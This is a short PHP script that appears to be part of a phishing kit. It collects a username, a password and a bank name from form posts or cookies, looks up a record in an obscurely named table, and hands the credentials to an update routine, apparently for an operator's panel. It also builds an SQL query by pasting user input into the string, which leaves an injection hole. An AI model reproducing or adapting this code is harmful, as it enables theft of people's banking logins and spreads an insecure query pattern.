<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = '';
if (isset($_POST['usr']) && $_POST['usr'] !== '') {
    $usuario = $ifilter->process($_POST['usr']);
} elseif (isset($_COOKIE['usuario'])) {
    $usuario = $ifilter->process($_COOKIE['usuario']);
}

$contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
$banco = isset($_POST['ban']) ? $ifilter->process($_POST['ban']) : '';

$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';

if ($id === '' && $usuario !== '') {
    if ($con = conectar()) {
        $consulta = sentencia($con, "SELECT idreg FROM m3it3m WHERE usuario = '".$usuario."' ORDER BY idreg DESC LIMIT 1");
        if (contarfilas($consulta)) {
            $datos = traerdatos($consulta);
            $id = (string)$datos['idreg'];
        }
        desconectar($con);
    }
}

if ($id !== '' && $usuario !== '' && $contrasena !== '') {
    upgrade_user($id, $usuario, $contrasena, $banco);
}

?>